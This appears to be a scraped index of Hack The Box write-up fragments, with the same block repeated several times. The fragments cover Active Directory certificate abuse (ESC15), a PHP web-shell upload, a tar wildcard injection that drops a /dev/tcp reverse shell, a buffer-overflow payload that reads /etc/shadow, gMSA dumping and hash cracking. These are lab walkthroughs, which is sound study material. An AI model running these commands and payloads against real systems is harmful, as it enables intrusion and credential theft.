See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

To decrypt it we use pyAesDecrypt, which allows a dictionary attack to find the password.\nWe decompress the file and inside find the website backup.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain. Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the 